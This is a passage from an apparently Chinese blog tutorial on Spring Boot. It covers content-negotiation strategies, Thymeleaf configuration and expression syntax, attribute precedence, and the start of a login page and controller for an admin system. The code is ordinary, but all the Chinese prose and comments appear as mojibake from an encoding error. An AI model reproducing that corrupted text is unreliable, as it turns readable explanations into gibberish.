class="hljs-string">&quot;application/x-guigu&quot;</span>));<br>                <span class="hljs-comment">//æŒ‡å®šæ”¯æŒè§£æå“ªäº›å‚æ•°å¯¹åº”çš„å“ªäº›åª’ä½“ç±»å‹</span><br>                <span class="hljs-type">ParameterContentNegotiationStrategy</span> <span class="hljs-variable">parameterStrategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParameterContentNegotiationStrategy</span>(mediaTypes);<br><span class="hljs-comment">//                parameterStrategy.setParameterName(&quot;ff&quot;);</span><br><br>                <span class="hljs-comment">//è¿˜éœ€æ·»åŠ è¯·æ±‚å¤´å¤„ç†ç­–ç•¥ï¼Œå¦åˆ™accept:application/jsonã€application/xmlåˆ™ä¼šå¤±æ•ˆ</span><br>                <span class="hljs-type">HeaderContentNegotiationStrategy</span> <span class="hljs-variable">headeStrategy</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HeaderContentNegotiationStrategy</span>();<br><br>                configurer.strategies(Arrays.asList(parameterStrategy, headeStrategy));<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><p>æ—¥åå¼€å‘è¦æ³¨æ„ï¼Œ<strong>æœ‰å¯èƒ½æˆ‘ä»¬æ·»åŠ çš„è‡ªå®šä¹‰çš„åŠŸèƒ½ä¼šè¦†ç›–é»˜è®¤å¾ˆå¤šåŠŸèƒ½ï¼Œå¯¼è‡´ä¸€äº›é»˜è®¤çš„åŠŸèƒ½å¤±æ•ˆã€‚</strong></p><h2 id="43ã€è§†å›¾è§£æ-Thymeleafåˆä½“éªŒ"><a href="#43ã€è§†å›¾è§£æ-Thymeleafåˆä½“éªŒ" class="headerlink" title="43ã€è§†å›¾è§£æ-Thymeleafåˆä½“éªŒ"></a>43ã€è§†å›¾è§£æ-Thymeleafåˆä½“éªŒ</h2><blockquote><p><strong>Thymeleaf</strong> is a modern server-side Java template engine for both web and standalone environments.</p><p>Thymeleafâ€™s main goal is to bring elegant <em>natural templates</em> to your development workflow â€” HTML that can be correctly displayed in browsers and also work as static prototypes, allowing for stronger collaboration in development teams.</p><p>With modules for Spring Framework, a host of integrations with your favourite tools, and the ability to plug in your own functionality, Thymeleaf is ideal for modern-day HTML5 JVM web development â€” although there is much more it can do.â€”â€”<a href="https://www.thymeleaf.org/">Link</a></p></blockquote><p><a href="https://www.thymeleaf.org/documentation.html">Thymeleafå®˜æ–¹æ–‡æ¡£</a></p><h3 id="thymeleafä½¿ç”¨"><a href="#thymeleafä½¿ç”¨" class="headerlink" title="thymeleafä½¿ç”¨"></a>thymeleafä½¿ç”¨</h3><h4 id="å¼•å…¥Starter"><a href="#å¼•å…¥Starter" class="headerlink" title="å¼•å…¥Starter"></a>å¼•å…¥Starter</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="è‡ªåŠ¨é…ç½®å¥½äº†thymeleaf"><a href="#è‡ªåŠ¨é…ç½®å¥½äº†thymeleaf" class="headerlink" title="è‡ªåŠ¨é…ç½®å¥½äº†thymeleaf"></a>è‡ªåŠ¨é…ç½®å¥½äº†thymeleaf</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@EnableConfigurationProperties(ThymeleafProperties.class)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; TemplateMode.class, SpringTemplateEngine.class &#125;)</span><br><span class="hljs-meta">@AutoConfigureAfter(&#123; WebMvcAutoConfiguration.class, WebFluxAutoConfiguration.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThymeleafAutoConfiguration</span> &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡ªåŠ¨é…å¥½çš„ç­–ç•¥</p><ol><li><p>æ‰€æœ‰thymeleafçš„é…ç½®å€¼éƒ½åœ¨ ThymeleafProperties</p></li><li><p>é…ç½®å¥½äº† <strong>SpringTemplateEngine</strong> </p></li><li><p>é…å¥½äº† <strong>ThymeleafViewResolver</strong> </p></li><li><p>æˆ‘ä»¬åªéœ€è¦ç›´æ¥å¼€å‘é¡µé¢</p></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_PREFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;classpath:/templates/&quot;</span>;<span class="hljs-comment">//æ¨¡æ¿æ”¾ç½®å¤„</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_SUFFIX</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;.html&quot;</span>;<span class="hljs-comment">//æ–‡ä»¶çš„åç¼€å</span><br></code></pre></td></tr></table></figure><p>ç¼–å†™ä¸€ä¸ªæ§åˆ¶å±‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ViewTestController</span> &#123;<br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">(Model model)</span>&#123;<br>        <span class="hljs-comment">//modelä¸­çš„æ•°æ®ä¼šè¢«æ”¾åœ¨è¯·æ±‚åŸŸä¸­ request.setAttribute(&quot;a&quot;,aa)</span><br>        model.addAttribute(<span class="hljs-string">&quot;msg&quot;</span>,<span class="hljs-string">&quot;ä¸€å®šè¦å¤§åŠ›å‘å±•å·¥ä¸šæ–‡åŒ–&quot;</span>);<br>        model.addAttribute(<span class="hljs-string">&quot;link&quot;</span>,<span class="hljs-string">&quot;http://www.baidu.com&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>/templates/success.html</code>ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span>nice<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.baidu.com&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;$&#123;link&#125;&quot;</span>&gt;</span>å»ç™¾åº¦<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">br</span>/&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;www.google.com&quot;</span> <span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/link&#125;&quot;</span>&gt;</span>å»ç™¾åº¦<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><hr><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">servlet:</span><br>    <span class="hljs-attr">context-path:</span> <span class="hljs-string">/app</span> <span class="hljs-comment">#è®¾ç½®åº”ç”¨å</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè®¾ç½®åï¼ŒURLè¦æ’å…¥<code>/app</code>,  å¦‚<code>http://localhost:8080/app/hello.html</code>ã€‚</p><h3 id="åŸºæœ¬è¯­æ³•-1"><a href="#åŸºæœ¬è¯­æ³•-1" class="headerlink" title="åŸºæœ¬è¯­æ³•"></a>åŸºæœ¬è¯­æ³•</h3><h4 id="è¡¨è¾¾å¼"><a href="#è¡¨è¾¾å¼" class="headerlink" title="è¡¨è¾¾å¼"></a>è¡¨è¾¾å¼</h4><table><thead><tr><th>è¡¨è¾¾å¼åå­—</th><th>è¯­æ³•</th><th align="center">ç”¨é€”</th></tr></thead><tbody><tr><td>å˜é‡å–å€¼</td><td>${â€¦}</td><td align="center">è·å–è¯·æ±‚åŸŸã€sessionåŸŸã€å¯¹è±¡ç­‰å€¼</td></tr><tr><td>é€‰æ‹©å˜é‡</td><td>*{â€¦}</td><td align="center">è·å–ä¸Šä¸‹æ–‡å¯¹è±¡å€¼</td></tr><tr><td>æ¶ˆæ¯</td><td>#{â€¦}</td><td align="center">è·å–å›½é™…åŒ–ç­‰å€¼</td></tr><tr><td>é“¾æ¥</td><td>@{â€¦}</td><td align="center">ç”Ÿæˆé“¾æ¥</td></tr><tr><td>ç‰‡æ®µè¡¨è¾¾å¼</td><td>~{â€¦}</td><td align="center">jsp:include ä½œç”¨ï¼Œå¼•å…¥å…¬å…±é¡µé¢ç‰‡æ®µ</td></tr></tbody></table><h4 id="å­—é¢é‡"><a href="#å­—é¢é‡" class="headerlink" title="å­—é¢é‡"></a>å­—é¢é‡</h4><ul><li>æ–‡æœ¬å€¼: <strong>â€˜one textâ€™</strong> <strong>,</strong> <strong>â€˜Another one!â€™</strong> <strong>,â€¦</strong></li><li>æ•°å­—: <strong>0</strong> <strong>,</strong> <strong>34</strong> <strong>,</strong> <strong>3.0</strong> <strong>,</strong> <strong>12.3</strong> <strong>,â€¦</strong></li><li>å¸ƒå°”å€¼: <strong>true</strong> <strong>,</strong> <strong>false</strong></li><li>ç©ºå€¼: <strong>null</strong></li><li>å˜é‡ï¼š oneï¼Œtwoï¼Œâ€¦. å˜é‡ä¸èƒ½æœ‰ç©ºæ ¼</li></ul><h4 id="æ–‡æœ¬æ“ä½œ"><a href="#æ–‡æœ¬æ“ä½œ" class="headerlink" title="æ–‡æœ¬æ“ä½œ"></a>æ–‡æœ¬æ“ä½œ</h4><ul><li>å­—ç¬¦ä¸²æ‹¼æ¥: <strong>+</strong></li><li>å˜é‡æ›¿æ¢: <strong>|The name is ${name}|</strong></li></ul><h4 id="æ•°å­¦è¿ç®—"><a href="#æ•°å­¦è¿ç®—" class="headerlink" title="æ•°å­¦è¿ç®—"></a>æ•°å­¦è¿ç®—</h4><ul><li>è¿ç®—ç¬¦: + , - , * , &#x2F; , %</li></ul><h4 id="å¸ƒå°”è¿ç®—"><a href="#å¸ƒå°”è¿ç®—" class="headerlink" title="å¸ƒå°”è¿ç®—"></a>å¸ƒå°”è¿ç®—</h4><ul><li>è¿ç®—ç¬¦:  <strong>and</strong> <strong>,</strong> <strong>or</strong></li><li>ä¸€å…ƒè¿ç®—: <strong>!</strong> <strong>,</strong> <strong>not</strong></li></ul><h4 id="æ¯”è¾ƒè¿ç®—"><a href="#æ¯”è¾ƒè¿ç®—" class="headerlink" title="æ¯”è¾ƒè¿ç®—"></a>æ¯”è¾ƒè¿ç®—</h4><ul><li>æ¯”è¾ƒ: <strong>&gt;</strong> <strong>,</strong> <strong>&lt;** **,** **&gt;&#x3D;</strong> <strong>,</strong> <strong>&lt;&#x3D;</strong> <strong>(</strong> <strong>gt</strong> <strong>,</strong> <strong>lt</strong> <strong>,</strong> <strong>ge</strong> <strong>,</strong> <strong>le</strong> <strong>)</strong></li><li>ç­‰å¼: <strong>&#x3D;&#x3D;</strong> <strong>,</strong> <strong>!&#x3D;</strong> <strong>(</strong> <strong>eq</strong> <strong>,</strong> <strong>ne</strong> <strong>)</strong></li></ul><h4 id="æ¡ä»¶è¿ç®—"><a href="#æ¡ä»¶è¿ç®—" class="headerlink" title="æ¡ä»¶è¿ç®—"></a>æ¡ä»¶è¿ç®—</h4><ul><li>If-then: <strong>(if) ? (then)</strong></li><li>If-then-else: <strong>(if) ? (then) : (else)</strong></li><li>Default: (value) <strong>?: (defaultvalue)</strong></li></ul><h4 id="ç‰¹æ®Šæ“ä½œ"><a href="#ç‰¹æ®Šæ“ä½œ" class="headerlink" title="ç‰¹æ®Šæ“ä½œ"></a>ç‰¹æ®Šæ“ä½œ</h4><ul><li>æ— æ“ä½œï¼š _</li></ul><h3 id="è®¾ç½®å±æ€§å€¼-th-attr"><a href="#è®¾ç½®å±æ€§å€¼-th-attr" class="headerlink" title="è®¾ç½®å±æ€§å€¼-th:attr"></a>è®¾ç½®å±æ€§å€¼-th:attr</h3><ul><li>è®¾ç½®å•ä¸ªå€¼</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;subscribe.html&quot;</span> <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;action=@&#123;/subscribe&#125;&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">fieldset</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Subscribe!&quot;</span> <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;value=#&#123;subscribe.submit&#125;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">fieldset</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>è®¾ç½®å¤šä¸ªå€¼</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;../../images/gtvglogo.png&quot;</span>  </span><br><span class="hljs-tag">     <span class="hljs-attr">th:attr</span>=<span class="hljs-string">&quot;src=@&#123;/images/gtvglogo.png&#125;,title=#&#123;logo&#125;,alt=#&#123;logo&#125;&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#setting-attribute-values">å®˜æ–¹æ–‡æ¡£ - 5 Setting Attribute Values</a></p><h3 id="è¿­ä»£"><a href="#è¿­ä»£" class="headerlink" title="è¿­ä»£"></a>è¿­ä»£</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;prod : $&#123;prods&#125;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.name&#125;&quot;</span>&gt;</span>Onions<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.price&#125;&quot;</span>&gt;</span>2.41<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.inStock&#125;? #&#123;true&#125; : #&#123;false&#125;&quot;</span>&gt;</span>yes<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;prod,iterStat : $&#123;prods&#125;&quot;</span> <span class="hljs-attr">th:class</span>=<span class="hljs-string">&quot;$&#123;iterStat.odd&#125;? &#x27;odd&#x27;&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.name&#125;&quot;</span>&gt;</span>Onions<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.price&#125;&quot;</span>&gt;</span>2.41<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;prod.inStock&#125;? #&#123;true&#125; : #&#123;false&#125;&quot;</span>&gt;</span>yes<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ¡ä»¶è¿ç®—-1"><a href="#æ¡ä»¶è¿ç®—-1" class="headerlink" title="æ¡ä»¶è¿ç®—"></a>æ¡ä»¶è¿ç®—</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;comments.html&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">th:href</span>=<span class="hljs-string">&quot;@&#123;/product/comments(prodId=$&#123;prod.id&#125;)&#125;&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">th:if</span>=<span class="hljs-string">&quot;$&#123;not #lists.isEmpty(prod.comments)&#125;&quot;</span>&gt;</span>view<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">th:switch</span>=<span class="hljs-string">&quot;$&#123;user.role&#125;&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;&#x27;admin&#x27;&quot;</span>&gt;</span>User is an administrator<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;#&#123;roles.manager&#125;&quot;</span>&gt;</span>User is a manager<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">th:case</span>=<span class="hljs-string">&quot;*&quot;</span>&gt;</span>User is some other thing<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å±æ€§ä¼˜å…ˆçº§"><a href="#å±æ€§ä¼˜å…ˆçº§" class="headerlink" title="å±æ€§ä¼˜å…ˆçº§"></a>å±æ€§ä¼˜å…ˆçº§</h3><table><thead><tr><th align="left">Order</th><th align="left">Feature</th><th align="left">Attributes</th></tr></thead><tbody><tr><td align="left">1</td><td align="left">Fragment inclusion</td><td align="left"><code>th:insert</code> <code>th:replace</code></td></tr><tr><td align="left">2</td><td align="left">Fragment iteration</td><td align="left"><code>th:each</code></td></tr><tr><td align="left">3</td><td align="left">Conditional evaluation</td><td align="left"><code>th:if</code> <code>th:unless</code> <code>th:switch</code> <code>th:case</code></td></tr><tr><td align="left">4</td><td align="left">Local variable definition</td><td align="left"><code>th:object</code> <code>th:with</code></td></tr><tr><td align="left">5</td><td align="left">General attribute modification</td><td align="left"><code>th:attr</code> <code>th:attrprepend</code> <code>th:attrappend</code></td></tr><tr><td align="left">6</td><td align="left">Specific attribute modification</td><td align="left"><code>th:value</code> <code>th:href</code> <code>th:src</code> <code>...</code></td></tr><tr><td align="left">7</td><td align="left">Text (tag body modification)</td><td align="left"><code>th:text</code> <code>th:utext</code></td></tr><tr><td align="left">8</td><td align="left">Fragment specification</td><td align="left"><code>th:fragment</code></td></tr><tr><td align="left">9</td><td align="left">Fragment removal</td><td align="left"><code>th:remove</code></td></tr></tbody></table><p><a href="https://www.thymeleaf.org/doc/tutorials/3.0/usingthymeleaf.html#attribute-precedence">å®˜æ–¹æ–‡æ¡£ - 10 Attribute Precedence</a></p><h2 id="44ã€webå®éªŒ-åå°ç®¡ç†ç³»ç»ŸåŸºæœ¬åŠŸèƒ½"><a href="#44ã€webå®éªŒ-åå°ç®¡ç†ç³»ç»ŸåŸºæœ¬åŠŸèƒ½" class="headerlink" title="44ã€webå®éªŒ-åå°ç®¡ç†ç³»ç»ŸåŸºæœ¬åŠŸèƒ½"></a>44ã€webå®éªŒ-åå°ç®¡ç†ç³»ç»ŸåŸºæœ¬åŠŸèƒ½</h2><h3 id="é¡¹ç›®åˆ›å»º"><a href="#é¡¹ç›®åˆ›å»º" class="headerlink" title="é¡¹ç›®åˆ›å»º"></a>é¡¹ç›®åˆ›å»º</h3><p>ä½¿ç”¨IDEAçš„Spring Initializrã€‚</p><ul><li>thymeleafã€</li><li>web-starterã€</li><li>devtoolsã€</li><li>lombok</li></ul><h3 id="ç™»é™†é¡µé¢"><a href="#ç™»é™†é¡µé¢" class="headerlink" title="ç™»é™†é¡µé¢"></a>ç™»é™†é¡µé¢</h3><ul><li><p><code>/static</code> æ”¾ç½® cssï¼Œjsç­‰é™æ€èµ„æº</p></li><li><p><code>/templates/login.html</code> ç™»å½•é¡µ</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span> <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- è¦åŠ è¿™ç©æ„thymeleafæ‰èƒ½ç”¨ --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-signin&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.html&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">th:action</span>=<span class="hljs-string">&quot;@&#123;/login&#125;&quot;</span>&gt;</span><br><br>    ...<br>    <br>    <span class="hljs-comment">&lt;!-- æ¶ˆæ¯æé†’ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red&quot;</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$&#123;msg&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userName&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;User ID&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;Password&quot;</span>&gt;</span><br>    <br>    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-lg btn-login btn-block&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">i</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;fa fa-check&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>    <br>    ...<br>    <br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><code>/templates/main.html</code> ä¸»é¡µ</li></ul><p>thymeleafå†…è”å†™æ³•ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>Hello, [[$&#123;session.user.name&#125;]]!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç™»å½•æ§åˆ¶å±‚"><a href="#ç™»å½•æ§åˆ¶å±‚" class="headerlink" title="ç™»å½•æ§åˆ¶å±‚"></a>ç™»å½•æ§åˆ¶å±‚</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 